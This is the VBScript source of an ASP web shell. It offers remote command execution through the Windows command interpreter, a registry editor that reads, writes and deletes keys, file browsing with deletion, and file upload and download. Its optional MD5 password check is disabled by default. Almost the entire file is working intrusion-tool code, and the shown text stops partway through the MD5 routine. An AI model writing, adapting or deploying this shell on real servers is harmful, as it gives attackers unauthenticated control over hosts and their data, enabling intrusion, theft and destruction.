<%@ Language = VBScript
    CodePage = 1252    %>

<%
Option Explicit
'/* ---								Options										--- */
Server.ScriptTimeout  =  360 					' Seconds
Session.Timeout       =  5   					' Minutes 
Response.Expires      =  -1  					' Minutes (expires immediately)
Private sMD5Hash          						' MD5("HitU")
''sMD5Hash = "F74648612C416B4CE4B9B36C10B10A11"	' Leave it empty to turn off password protection
'Session.Abandon           						' Terminates last session, prevents hangups
'On Error Resume Next      						' Proceed to the next line on error

' Global variables:
Private  WShell, WNetwork, WEnv, FSO, BinStream
Private  sURL, sCmd, bBgMode, bSI, sKey, sKeyFunc, sKeyValue, sKeyType
Private  sDir, sDel, sDL, sPasswd

' Create COM objects:
Set WShell    = Server.CreateObject("WSCRIPT.SHELL")
Set WNetwork  = Server.CreateObject("WSCRIPT.NETWORK")
Set WEnv      = WShell.Environment("Process")
Set FSO       = Server.CreateObject("Scripting.FileSystemObject")

' Process script args:
sURL      = Request.ServerVariables("URL")		' Script relative addr.
sCmd      = Request("CMD")						' Shell: command
bBgMode   = Request("CMD_M")					' Shell: mode
bSI       = Request("SI")						' Server info
sKey      = Request("RKEY")						' Reg editor: key
sKeyFunc  = Request("RKEY_F")					' Reg editor: function
sKeyValue = Request("RKEY_V")					' Reg editor: value
sKeyType  = Request("RKEY_T")					' Reg editor: type
sDir      = Request("DIR")						' Directory listing: path
sDel      = Request("DEL")						' Directory listing: delete item
sDL       = Request("DL")                       ' Download: file path
sPasswd   = Request("PWD")                      ' Password: clear text

' Set default mode:
If ( IsEmpty(sCmd) And _
	 IsEmpty(bSI)  And _
	 IsEmpty(sKey) And _
	 IsEmpty(sDir)       ) Then
	 sDir = ""
End If

'/* ---								Routines									--- */

' Executes command and passes stdout to browser.
' Can start the process in background mode.
Private Sub ExecuteCmd(ByVal sCommand, ByVal bBg)
	Dim Pipe, RetCode
	On Error Resume Next
	If ( bBg <> "" ) Then
		RetCode = WShell.Run("%comspec% /c " & sCommand & " 2>&1", 0, False)
		Response.Write("Returned: " & RetCode)
	Else
		Set Pipe = WShell.Exec("%comspec% /c " & sCommand & " 2>&1")
		While( Not Pipe.StdOut.AtEndOfStream )
   			Response.Write(Server.HTMLEncode(Pipe.StdOut.ReadAll()))
		WEnd
		Response.Write("Returned: " & Pipe.ExitCode)
	End If
	' Error handling:
    If ( Err.Number <> 0 ) Then
		Response.Write("Error: '" & Err.Description & "' [" & Err.Number & "]")
		Err.Clear
    End If
	Set Pipe    = nothing
	Set RetCode = nothing
End Sub

' Returns first word from the string. Used in shell page title.
Private Function GetFirstWord(ByVal sStr)
	Dim Word
	If ( Len(sStr) <> 0 ) Then
		Word = Split(sStr)
		GetFirstWord = Word(0)
	Else
		GetFirstWord = "[ Shell ]"
	End if
	Set Word = nothing
End Function

' Changes empty string to nbsp. Useful while building HTML tables.
Private Function EmptyToNbsp(ByVal sStr)
	If ( sStr = "" ) Then
		sStr = "&nbsp;"
	End If
	EmptyToNbsp = sStr
End Function

' Converts unicode string to byte string.
Private Function CStrB(ByRef sUnicodeStr)
	Dim nPos
	For nPos = 1 To Len(sUnicodeStr)
		CStrB = CStrB & ChrB( AscB( Mid(sUnicodeStr, nPos, 1)))
	Next
End Function

' Converts byte string to unicode string.
Private Function CStrU(ByRef sByteStr)
	Dim nPos
	For nPos = 1 To LenB(sByteStr)
		CStrU = CStrU & Chr( AscB( MidB(sByteStr, nPos, 1)))
	Next
End Function

' Returns string, containing HTML table with drives info.
Private Function ShowDrivesInfo()
   On Error Resume Next
   Dim Drive, Share, Str
   ' Table header:
   Str = "<table border='1' cellspacing='0' cellpadding='2' width='600'>"           & _
         "<tr align='center'><th colspan='9'>Drives Info</th></tr>"                 & _
         "<tr align='center'><th>Drive</th><th>Type</th><th>Label</th>"             & _
         "<th>Filesystem</th><th>Size[Mb]</th><th>Avail[Mb]</th><th>Free[Mb]</th>"  & _
         "<th>Shared</th><th>Ready</th></tr>"
   ' Enumerate drives:
   For Each Drive in FSO.Drives
      Str = Str & "<tr align='center' class='drv'><td>" & Drive.DriveLetter & "</td>"
      Select Case Drive.DriveType
      	Case 0: Str = Str & "<td>Unknown</td>"
      	Case 1: Str = Str & "<td>Removable</td>"
      	Case 2: Str = Str & "<td>Fixed</td>"
      	Case 3: Str = Str & "<td>Network</td>"
      	Case 4: Str = Str & "<td>CD-ROM</td>"
      	Case 5: Str = Str & "<td>RAM Disk</td>"
	  End Select
      ' Prevents from 500 - "drive not ready" error:
      If Drive.IsReady Then
       		Str = Str & "<td>" & EmptyToNbsp(Drive.VolumeName)                   & "</td>"
      		Str = Str & "<td>" & Drive.FileSystem                                & "</td>"
      		Str = Str & "<td>" & FormatNumber(Drive.TotalSize / 1048576, 0)      & "</td>"
      		Str = Str & "<td>" & FormatNumber(Drive.AvailableSpace / 1048576, 0) & "</td>"
      		Str = Str & "<td>" & FormatNumber(Drive.FreeSpace / 1048576, 0)      & "</td>"
      Else
      		Str = Str & "<td>-</td><td>-</td><td>-</td><td>-</td><td>-</td>"
      End If
      If (Drive.ShareName = "") Then
      		Str = Str & "<td>-</td>"
      Else
      		Str = Str & "<td>" & Drive.ShareName & "</td>"
      End If
      Str = Str & "<td>" & Drive.IsReady & "</td></tr>"
   Next
   ' Error handling:
   If ( Err.Number <> 0 ) Then
		Response.Write( "Error: '" & Err.Description & "' at " & Err.Source & " [" & Err.Number & "]" )
		Err.Clear
   End If
   ShowDrivesInfo = Str & "</table>"
   Set Drive = nothing
   Set Share = nothing
   Set Str   = nothing
End Function

' Provides interface for registry read/write/delete functions.
Private Function RegEditor(ByVal sKey, ByVal sKeyValue, ByVal sKeyType, ByVal sKeyFunc)
	On Error Resume Next
	Select Case sKeyFunc
	Case "Read"		Response.Write(WShell.RegRead(sKey))
	Case "Write"
					If ( sKeyType = "REG_SZ"         or _
						 sKeyType = "REG_DWORD"      or _
						 sKeyType = "REG_BINARY"     or _
						 sKeyType = "REG_EXPAND_SZ"       ) Then
						 If ( Not IsEmpty(sKeyValue) ) Then
						 		Response.Write(WShell.RegWrite(sKey, sKeyValue, sKeyType))
						 Else
						 		Response.Write("Key value is not defined.")
						 End If
					Else
						 Response.Write("Improper key type.")
					End If
	Case "Delete"	Response.Write(WShell.RegDelete(sKey))
	Case Else		Response.Write("Improper function value.")
	End Select
	' Error handling:
	If ( Err.Number <> 0 ) Then
		Response.Write( "Error: '" & Err.Description & "' at " & Err.Source & " [" & Err.Number & "]" )
		Err.Clear
	Else
		Response.Write("Successfully performed the operation.")
	End If
End Function

' Returns directory path without trailing slash.
Private Function GetCorrectPath(ByVal sDir)
   	Dim sDirPath
   	' Starting folder:
	If ( sDir = "" ) Then
		sDir  = Server.MapPath(".")
	End If
	' Get correct folder path:
	If ( FSO.FolderExists(sDir) ) Then
		sDirPath   = FSO.GetFolder(sDir).Path
	Else
		sDirPath = sDir
	End If
	GetCorrectPath = sDirPath
	Set sDirPath = nothing 
End Function

' Returns string with HTML table.
Private Function ShowDirectoryList(ByVal sDir)
	On Error Resume Next
	Dim  sDirPath, Str, Folder, Item, Attr

	sDirPath   = GetCorrectPath(sDir)
	Set Folder = FSO.GetFolder(sDirPath) 

	' Path input field:
	Str = "<center><form name='path' action='" & sURL & "' method='POST'>"              & _
	      "<input name='DIR' type='text' style='width:80%;' value='" & sDirPath & "'>"  & _
	      "&nbsp;<input type='submit' class='button' value='Go'></form><br>"
	
	' Check the path:
	If ( Not FSO.FolderExists(sDirPath) ) Then
		ShowDirectoryList = Str & "Folder <b>" & sDirPath & "</b> doesn't exist.<br>"
		Exit Function
	End If
	
	' Table header:
	Str = Str & "Contents of <b>" & sDirPath & "</b><br><br>"                      & _
	            "<form  name='items' action='" & sURL & "' method='POST'>"         & _
	            "<input name='DIR' type='hidden' value='" & sDirPath & "'>"        & _
	            "<input name='DEL' type='hidden' value=''>"                        & _
	            "<table border='1' cellpadding='0' cellspacing='0' width='90%'>"   & _
                "<tr><th>&nbsp;</th><th>Name</th><th>Size[b]</th>"                 & _
                "<th>Date Created</th><th>Attributes</th><th>Type</th></tr>"
	
	' Parent directory:
	If ( Not Folder.IsRootFolder ) Then
		Str = Str & "<tr onMouseOver='this.style.backgroundColor=""#eeeeee""'"     & _
		            " onMouseOut='this.style.backgroundColor=""""' class='dir'>"   & _
    		        "<td>&nbsp;</td>"                                              & _
    		        "<td class='dir' onclick='go("".."");'>&lt;..&gt;</td>"        & _
    		        "<td>&nbsp;</td>"                                              & _
			        "<td>&nbsp;</td>"                                              & _
			        "<td>&nbsp;</td>"                                              & _
			        "<td>Parent Folder</td></tr>"                             & vbCRLF
	End If
	
	' Directories:
	For Each Item In Folder.SubFolders
		If ( Item.Attributes And 1 ) Then 
   			Attr = "R(" & Item.Attributes & ")"
		Else 
   			Attr = "RW(" & Item.Attributes & ")"
		End If
		Str = Str & "<tr onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
		            " onMouseOut='this.style.backgroundColor=""""' class='dir'>"  & _
		            "<td><input type='button' class='button' style='width:28;'"   & _
		            " value='Del' onclick='del(""" & Item.Name & "\\"");'></td>"  & _
		            "<td class='dir' onclick='go(""" & Item.Name & """);'>"       & _
		            "&lt;"     & Item.Name                  & "&gt;</td>"         & _
		            "<td>"     & FormatNumber(Item.Size, 0) & "</td>"             & _
		            "<td>"     & Item.DateCreated           & "</td>"             & _
		            "<td>"     & Attr                       & "</td>"             & _
		            "<td>"     & Item.Type                  & "</td></tr>"  &  vbCRLF
	Next 
	
	' Files:
	For Each Item In Folder.Files
		' Add cacls?
		If ( Item.Attributes And 1 ) Then 
   			Attr = "R(" & Item.Attributes & ")"
		Else 
   			Attr = "RW(" & Item.Attributes & ")"
		End If
		Str = Str & "<tr onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
		            " onMouseOut='this.style.backgroundColor=""""' class='file'>" & _
		            "<td><input type='button' class='button' style='width:28;'"   & _
		            " value='Del' onclick='del(""" & Item.Name & """);'></td>"    & _
		            "<td class='file' onclick='dl(""" & Item.Name & """);'>"      & _
		                     Item.Name                  & "</td>"                 & _
		            "<td>" & FormatNumber(Item.Size, 0) & "</td>"                 & _
		            "<td>" & Item.DateCreated           & "</td>"                 & _
		            "<td>" & Attr                       & "</td>"                 & _
		            "<td>" & Item.Type                  & "</td></tr>"      &  vbCRLF
	Next
	Str = Str & "</table></form><br><br>"
	
	' Download form:
	Str = Str & "<form  name='download' action='" & sURL & "' method='POST'>"                             & _
	            "<input name='DL' type='hidden' value='" & sDirPath & "'></form>"                         & _
	            "<form  name='upload' enctype='multipart/form-data' action='" & sURL & "' method='POST'>" & _
                "<input name='UL' type='hidden' value='" & sDirPath & "'>"                                & _
                "<input name='FILE' type='file' style='width:80%;'>&nbsp;"                                & _
                "<input type='submit' class='button' value='Upload'></form><br><br></center>"
	
	' Error handling:
    If ( Err.Number <> 0 ) Then
		Str = Str & "<center>Error: '" & Err.Description & "' [" & Err.Number & "]</center><br><br>"
		Err.Clear
    End If
	
	ShowDirectoryList = Str
	Set sDirPath = nothing
	Set Str      = nothing
	Set Folder   = nothing
	Set Item     = nothing
	Set Attr     = nothing
End Function

' Upload FSO buffering.
Private Function BufferContent(ByRef Data)
	Dim sContent(64), i
	ClearString(sContent)
	For i = 1 To LenB(Data)
		AddString sContent, Chr(AscB (MidB (Data, i, 1)))
	Next
	BufferContent = ReadString(sContent)
End Function

Private Sub ClearString(ByRef sPart)
	Dim nIdx
	For nIdx = 0 to 64
		sPart(nIdx) = ""
	Next
End Sub

Private Sub AddString(ByRef sPart, ByRef Str)
	Dim Tmp, nIdx
	sPart(0) = sPart(0) & Str
	If ( Len(sPart(0)) > 64 ) Then
		nIdx = 0
		Tmp  = ""
		Do
			Tmp = sPart(nIdx) & Tmp
			sPart(nIdx) = ""
			nIdx = nIdx + 1
		Loop Until sPart(nIdx) = ""
		sPart(nIdx) = Tmp
	End If
End Sub

Private Function ReadString(ByRef sPart)
	Dim Tmp, nIdx
	Tmp = ""
	For nIdx = 0 to 64
		If ( sPart(nIdx) <> "" ) Then
			Tmp = sPart(nIdx) & Tmp
		End If
	Next
	ReadString = Tmp
End Function

' Saves uploaded file.
Private Sub UploadFile()
	Dim BinData, nObjStartPos, nObjEndPos, nStartPos, nEndPos, sBoundary
	Dim sFileName, sSavePath, nFileLen, BinFile, PostBinStream
	
	On Error Resume Next
	Err.Clear 
	BinData = Request.BinaryRead(Request.TotalBytes)
	
	' Get the boundary:
	nStartPos = 1
	nEndPos   = InStrB(nStartPos, BinData, CStrB(vbCR))
	If ( nEndPos > nStartPos ) Then
		sBoundary = MidB(BinData, nStartPos, nEndPos - nStartPos)
	Else
		Response.Write("Error: Boundary is not defined.")
		StopScript
	End If
	
	' Get the upload directory("UL"):
	nObjStartPos = InStrB(1, BinData, sBoundary)
	nObjEndPos   = InStrB(nObjStartPos + 1, BinData, sBoundary)
	nStartPos    = InStrB(nObjStartPos, BinData, CStrB("name=""UL"""))
	If ( nStartPos > nObjStartPos And nStartPos < nObjEndPos ) Then
		nEndPos  = InStrB(nStartPos + 13, BinData, CStrB(vbCR))
		' nStartPos + 13 -> name="UL"+ 0x0D + 0x0A + 0x0D + 0x0A
		sDir     = CStrU(MidB(BinData, nStartPos + 13, nEndPos - nStartPos - 13))
	Else
		Response.Write("Error: Upload directory(""UL"") is not defined.")
		StopScript
	End If
	
	' Get file's binary data:
	nObjStartPos = nObjEndPos
	nObjEndPos   = InStrB(nObjStartPos + 1, BinData, sBoundary & CStrB("--"))
	nStartPos    = InStrB(nObjStartPos + 1, BinData, CStrB("name=""FILE"""))
	If ( nStartPos > 0 And nObjEndPos > nObjStartPos ) Then
		' Get the filename:
		nStartPos = InStrB(nStartPos, BinData, CStrB("filename="""))
		nEndPos   = InStrB(nStartPos + 10, BinData, CStrB(""""))
		If ( nStartPos + 10 = nEndPos Or nStartPos = 0 ) Then
			Response.Write("Uploaded: 0 bytes [Empty filename] ")
			Exit Sub
		End If
		sFileName = CStrU(MidB(BinData, nStartPos + 10, nEndPos - nStartPos - 10))
        
        ' Change all '/' to '\':
        sFileName = Replace(sFileName, "/", "\")
        sFileName = Right(sFileName, Len(sFileName) - InStrRev(sFileName, "\"))
        sFileName = Trim(sFileName)
        
        ' Skip Content-Type:
        nStartPos = InStrB(nEndPos, BinData, CStrB("Content-Type:"))
        nEndPos   = InStrB(nStartPos + 13, BinData, CStrB(vbCR))
        If ( nStartPos = 0 or nEndPos = 0 ) Then
        	Response.Write("Error: Content-Type is not defined.")
        	StopScript
        End If
        
        ' Skip CRLFs and set pointers to file's binary data:
        nStartPos = nEndPos    + 3
        nEndPos   = nObjEndPos - 3
        nFileLen  = nEndPos - nStartPos
        BinFile   = MidB(BinData, nStartPos + 1, nFileLen)
        sSavePath = FSO.BuildPath(sDir, sFileName)
        
		' Save binary data into the destination file:
        SetLocale(1033)
        Err.Clear
        Set PostBinStream  = Server.CreateObject("ADODB.Stream")
        Set BinStream      = Server.CreateObject("ADODB.Stream")
        If ( Err.Number = 0 ) Then
        	PostBinStream.Type = 1 ' adTypeBinary
			PostBinStream.Open()
			PostBinStream.Write(BinData)
			PostBinStream.Position = nStartPos
			BinStream.Type = 1
			BinStream.Open()
			PostBinStream.CopyTo BinStream, nFileLen
			' Overwrites file:
			BinStream.SaveToFile sSavePath, 2
			BinStream.Close()
			PostBinStream.Close()
		Else
			Err.Clear
			' Use FSO (only text data), if ADO.Stream is not there: 
			Set BinStream = FSO.CreateTextFile(sSavePath, True)
			BinStream.Write(BufferContent(BinFile))
			BinStream.Close()
		End If
        Response.Write("Uploaded: " & FormatNumber(nFileLen, 0) & " bytes [""" & sSavePath & """] ")
	Else
		Response.Write("Error: File's binary data parse error.")
		StopScript
	End If
	
	' Error handling:
    If ( Err.Number <> 0 ) Then
		Response.Write("Error: '" & Err.Description & "' [" & Err.Number & "]")
		Err.Clear
    End If
    
    ' Free mallocs ;)
	Set BinData       = nothing  :  Set nObjStartPos = nothing
	Set nObjEndPos    = nothing  :  Set nStartPos    = nothing
	Set nEndPos       = nothing  :  Set sBoundary    = nothing
	Set sFileName     = nothing  :  Set sSavePath    = nothing
	Set nFileLen      = nothing  :  Set BinFile      = nothing
	Set PostBinStream = nothing
End Sub

' Generates script navigation HTML string.
Private Function InsertNavBar()
	Dim Str
	Str = "<center><form name='nav' action='" & sURL & "' method='POST'>"              & _
	      "<input name='change' type='hidden' value=''></form>&lt;&nbsp;"              & _
	      "<span class='link' onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
	      " onMouseOut='this.style.backgroundColor=""""'"                              & _
	      " onclick='document.nav.change.name=""DIR"";document.nav.submit()'>"         & _
	      "Directory Listing</span>&nbsp;|&nbsp;"                                      & _
	      "<span class='link' onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
	      " onMouseOut='this.style.backgroundColor=""""'"                              & _
	      " onclick='document.nav.change.name=""CMD"";document.nav.submit()'>"         & _
	      "Shell</span>&nbsp;|&nbsp;"                                                  & _
	      "<span class='link' onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
	      " onMouseOut='this.style.backgroundColor=""""'"                              & _
	      " onclick='document.nav.change.name=""RKEY"";document.nav.submit()'>"        & _
	      "Registry Editor</span>&nbsp;|&nbsp;"                                        & _
	      "<span class='link' onMouseOver='this.style.backgroundColor=""#eeeeee""'"    & _
	      " onMouseOut='this.style.backgroundColor=""""'"                              & _
	      " onclick='document.nav.change.name=""SI"";document.nav.submit()'>"          & _
	      "Server Info</span>&nbsp;&gt;</center><br><br>"
	InsertNavBar = Str
	Set Str = nothing
End Function

' Generates auth. page and checks for proper password.
Private Function CheckAuth(ByVal sPasswd)
	Dim Str
	If ( sMD5Hash = "" ) Then
		Exit Function
	End If
	' Save the hash in a session variable: 
	If ( Not IsEmpty(sPasswd) ) Then
		Session("Auth") = MD5(sPasswd)
	End If
	' Check the password:
	If ( IsEmpty(Session("Auth")) ) Then
		Str = "<html><head><title>Authentication</title></head><body><center>"                   & _
		      "Enter the password: <form  name='download' action='" & sURL & "' method='POST'>"  & _
		      "<input name='PWD' type='text' style='width:80%;' value=''>&nbsp;"                 & _
	          "<input type='submit' value='Submit'></form></body></html>"
	    Response.Write(Str)
	    Session.Abandon
	    StopScript
	Else
		If ( UCase(Session("Auth")) <> UCase(sMD5Hash) ) Then
			Response.Write("Bad password or session has timed out.")
			Session.Abandon
			StopScript
		End If
	End If
End Function

' MD5 Routines.
' Ripped from frez.co.uk
Private Const	BITS_TO_A_BYTE  = 8
Private Const	BYTES_TO_A_WORD = 4
Private Const	BITS_TO_A_WORD  = 32
Private 		m_lOnBits(30)
Private 		m_l2Power(30)
    			m_lOnBits(0)  = CLng(1)
    			m_lOnBits(1)  = CLng(3)
    			m_lOnBits(2)  = CLng(7)
    			m_lOnBits(3)  = CLng(15)
    			m_lOnBits(4)  = CLng(31)
    			m_lOnBits(5)  = CLng(63)
    			m_lOnBits(6)  = CLng(127)
    			m_lOnBits(7)  = CLng(255)
    			m_lOnBits(8)  = CLng(511)
    			m_lOnBits(9)  = CLng(1023)
    			m_lOnBits(10) = CLng(2047)
    			m_lOnBits(11) = CLng(4095)
    			m_lOnBits(12) = CLng(8191)
    			m_lOnBits(13) = CLng(16383)
    			m_lOnBits(14) = CLng(32767)
    			m_lOnBits(15) = CLng(65535)
    			m_lOnBits(16) = CLng(131071)
    			m_lOnBits(17) = CLng(262143)
    			m_lOnBits(18) = CLng(524287)
    			m_lOnBits(19) = CLng(1048575)
    			m_lOnBits(20) = CLng(2097151)
    			m_lOnBits(21) = CLng(4194303)
    			m_lOnBits(22) = CLng(8388607)
    			m_lOnBits(23) = CLng(16777215)
    			m_lOnBits(24) = CLng(33554431)
    			m_lOnBits(25) = CLng(67108863)
    			m_lOnBits(26) = CLng(134217727)
    			m_lOnBits(27) = CLng(268435455)
    			m_lOnBits(28) = CLng(536870911)
    			m_lOnBits(29) = CLng(1073741823)
    			m_lOnBits(30) = CLng(2147483647)
    			m_l2Power(0)  = CLng(1)
    			m_l2Power(1)  = CLng(2)
    			m_l2Power(2)  = CLng(4)
    			m_l2Power(3)  = CLng(8)
    			m_l2Power(4)  = CLng(16)
    			m_l2Power(5)  = CLng(32)
    			m_l2Power(6)  = CLng(64)
    			m_l2Power(7)  = CLng(128)
    			m_l2Power(8)  = CLng(256)
    			m_l2Power(9)  = CLng(512)
    			m_l2Power(10) = CLng(1024)
    			m_l2Power(11) = CLng(2048)
    			m_l2Power(12) = CLng(4096)
    			m_l2Power(13) = CLng(8192)
    			m_l2Power(14) = CLng(16384)
    			m_l2Power(15) = CLng(32768)
    			m_l2Power(16) = CLng(65536)
    			m_l2Power(17) = CLng(131072)
    			m_l2Power(18) = CLng(262144)
    			m_l2Power(19) = CLng(524288)
    			m_l2Power(20) = CLng(1048576)
    			m_l2Power(21) = CLng(2097152)
    			m_l2Power(22) = CLng(4194304)
    			m_l2Power(23) = CLng(8388608)
    			m_l2Power(24) = CLng(16777216)
    			m_l2Power(25) = CLng(33554432)
    			m_l2Power(26) = CLng(67108864)
    			m_l2Power(27) = CLng(134217728)
    			m_l2Power(28) = CLng(268435456)
    			m_l2Power(29) = CLng(536870912)
    			m_l2Power(30) = CLng(1073741824)
	
	Private Function LShift(ByVal lValue, ByVal iShiftBits)
    	If ( iShiftBits = 0 ) Then
        	LShift = lValue
        	Exit Function
    	ElseIf ( iShiftBits = 31 ) Then
        	If lValue And 1 Then
            	LShift = &H80000000
        	Else
            	LShift = 0
        	End If
        Exit Function
    	ElseIf ( iShiftBits < 0 Or iShiftBits > 31 ) Then
        	Err.Raise(6)
    	End If
    	If ( lValue And m_l2Power(31 - iShiftBits) ) Then
        	LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
    	Else
        	LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
    	End If
	End Function
	
	Private Function RShift(lValue, iShiftBits)
    	If ( iShiftBits = 0 ) Then
        	RShift = lValue
        	Exit Function
    	ElseIf ( iShiftBits = 31 ) Then
        	If ( lValue And &H80000000 ) Then
            	RShift = 1
        	Else
            	RShift = 0
        	End If
        	Exit Function
    	ElseIf ( iShiftBits < 0 Or iShiftBits > 31 ) Then
        	Err.Raise(6)
    	End If
    	RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)
    	If ( lValue And &H80000000 ) Then
        	RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
    	End If
	End Function
	
	Private Function RotateLeft(lValue, iShiftBits)
    	RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
	End Function
	
	Private Function AddUnsigned(lX, lY)
    	Dim lX4, lY4, lX8, lY8, lResult
    	lX8 = lX And &H80000000
    	lY8 = lY And &H80000000
    	lX4 = lX And &H40000000
    	lY4 = lY And &H40000000
    	lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
    	If ( lX4 And lY4 ) Then
        	lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
    	ElseIf ( lX4 Or lY4 ) Then
        	If ( lResult And &H40000000 ) Then
            	lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
        	Else
            	lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
        	End If
    	Else
        	lResult = lResult Xor lX8 Xor lY8
    	End If
    	AddUnsigned = lResult
	End Function
	
	Private Function F(x, y, z)
    	F = (x And y) Or ((Not x) And z)
	End Function
	
	Private Function G(x, y, z)
    	G = (x And z) Or (y And (Not z))
	End Function
	
	Private Function H(x, y, z)
    	H = (x Xor y Xor z)
	End Function
	
	Private Function I(x, y, z)
    	I = (y Xor (x Or (Not z)))
	End Function
	
	Private Sub FF(a, b, c, d, x, s, ac)
    	a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac))
    	a = RotateLeft(a, s)
    	a = AddUnsigned(a, b)
	End Sub
	
	Private Sub GG(a, b, c, d, x, s, ac)
    	a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac))
    	a = RotateLeft(a, s)
    	a = AddUnsigned(a, b)
	End Sub
	
	Private Sub HH(a, b, c, d, x, s, ac)
    	a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac))
    	a = RotateLeft(a, s)
    	a = AddUnsigned(a, b)
	End Sub
	
	Private Sub II(a, b, c, d, x, s, ac)
    	a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac))
    	a = RotateLeft(a, s)
    	a = AddUnsigned(a, b)
	End Sub
	
	Private Function ConvertToWordArray(sMessage)
    	Dim lMessageLength, lNumberOfWords, lWordArray(), lBytePosition, lByteCount, lWordCount
    	Const MODULUS_BITS   = 512
    	Const CONGRUENT_BITS = 448
    	lMessageLength = Len(sMessage)
    	lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
    	ReDim lWordArray(lNumberOfWords - 1)
    	lBytePosition = 0
    	lByteCount    = 0
    	Do Until lByteCount >= lMessageLength
        	lWordCount = lByteCount \ BYTES_TO_A_WORD
        	lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
        	lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
        	lByteCount = lByteCount + 1
    	Loop
    	lWordCount = lByteCount \ BYTES_TO_A_WORD
    	lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
	    lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)
    	lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
   		lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
    	ConvertToWordArray = lWordArray
	End Function
	
	Private Function WordToHex(lValue)
    	Dim lByte, lCount
    	For lCount = 0 To 3
        	lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
        	WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
    	Next
	End Function
	
Private Function MD5(sMessage)
    Dim x, k, AA, BB, CC, DD, a, b, c, d
    Const S11 = 7
    Const S12 = 12
    Const S13 = 17
    Const S14 = 22
    Const S21 = 5
    Const S22 = 9
    Const S23 = 14
    Const S24 = 20
    Const S31 = 4
    Const S32 = 11
    Const S33 = 16
    Const S34 = 23
    Const S41 = 6
    Const S42 = 10
    Const S43 = 15
    Const S44 = 21
    x = ConvertToWordArray(sMessage)
    a = &H67452301
    b = &HEFCDAB89
    c = &H98BADCFE
    d = &H10325476
    For k = 0 To UBound(x) Step 16
        AA = a
        BB = b
        CC = c
        DD = d
        FF  a, b, c, d, x(k + 0),  S11, &HD76AA478
        FF  d, a, b, c, x(k + 1),  S12, &HE8C7B756
        FF  c, d, a, b, x(k + 2),  S13, &H242070DB
        FF  b, c, d, a, x(k + 3),  S14, &HC1BDCEEE
        FF  a, b, c, d, x(k + 4),  S11, &HF57C0FAF
        FF  d, a, b, c, x(k + 5),  S12, &H4787C62A
        FF  c, d, a, b, x(k + 6),  S13, &HA8304613
        FF  b, c, d, a, x(k + 7),  S14, &HFD469501
        FF  a, b, c, d, x(k + 8),  S11, &H698098D8
        FF  d, a, b, c, x(k + 9),  S12, &H8B44F7AF
        FF  c, d, a, b, x(k + 10), S13, &HFFFF5BB1
        FF  b, c, d, a, x(k + 11), S14, &H895CD7BE
        FF  a, b, c, d, x(k + 12), S11, &H6B901122
        FF  d, a, b, c, x(k + 13), S12, &HFD987193
        FF  c, d, a, b, x(k + 14), S13, &HA679438E
        FF  b, c, d, a, x(k + 15), S14, &H49B40821
        GG  a, b, c, d, x(k + 1),  S21, &HF61E2562
        GG  d, a, b, c, x(k + 6),  S22, &HC040B340
        GG  c, d, a, b, x(k + 11), S23, &H265E5A51
        GG  b, c, d, a, x(k + 0),  S24, &HE9B6C7AA
        GG  a, b, c, d, x(k + 5),  S21, &HD62F105D
        GG  d, a, b, c, x(k + 10), S22, &H2441453
        GG  c, d, a, b, x(k + 15), S23, &HD8A1E681
        GG  b, c, d, a, x(k + 4),  S24, &HE7D3FBC8
        GG  a, b, c, d, x(k + 9),  S21, &H21E1CDE6
        GG  d, a, b, c, x(k + 14), S22, &HC33707D6
        GG  c, d, a, b, x(k + 3),  S23, &HF4D50D87
        GG  b, c, d, a, x(k + 8),  S24, &H455A14ED
        GG  a, b, c, d, x(k + 13), S21, &HA9E3E905
        GG  d, a, b, c, x(k + 2),  S22, &HFCEFA3F8
        GG  c, d, a, b, x(k + 7),  S23, &H676F02D9
        GG  b, c, d, a, x(k + 12), S24, &H8D2A4C8A
        HH  a, b, c, d, x(k + 5),  S31, &HFFFA3942
        HH  d, a, b, c, x(k + 8),  S32, &H8771F681
        HH  c, d, a, b, x(k + 11), S33, &H6D9D6122
        HH  b, c, d, a, x(k + 14), S34, &HFDE5380C
        HH  a, b, c, d, x(k + 1),  S31, &HA4BEEA44
        HH  d, a, b, c, x(k + 4),  S32, &H4BDECFA9
        HH  c, d, a, b, x(k + 7),  S33, &HF6BB4B60
        HH  b, c, d, a, x(k + 10), S34, &HBEBFBC70
        HH  a, b, c, d, x(k + 13), S31, &H289B7EC6
        HH  d, a, b, c, x(k + 0),  S32, &HEAA127FA
        HH  c, d, a, b, x(k + 3),  S33, &HD4EF3085
        HH  b, c, d, a, x(k + 6),  S34, &H4881D05
        HH  a, b, c, d, x(k + 9),  S31, &HD9D4D039
        HH  d, a, b, c, x(k + 12), S32, &HE6DB99E5
